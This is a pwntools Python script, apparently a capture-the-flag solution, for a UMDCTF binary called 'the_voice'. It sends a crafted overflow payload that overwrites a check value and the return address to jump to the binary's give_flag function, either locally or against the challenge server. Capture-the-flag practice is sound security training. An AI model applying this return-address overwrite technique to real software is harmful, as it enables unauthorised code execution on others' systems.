#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './the_voice'
elf = context.binary = ELF(exe, checksec=True)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'challs.umdctf.io', 31192

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

# =========================================================
#                         EXPLOITS
# =========================================================

payload = flat({
    0x00: b'15', 
    0x18: 0x27cf,
    0x28: elf.sym['give_flag']
})

r.sendlineafter(b"If you want the flag, command me to give it to you.", payload)
r.recvline()

r.interactive()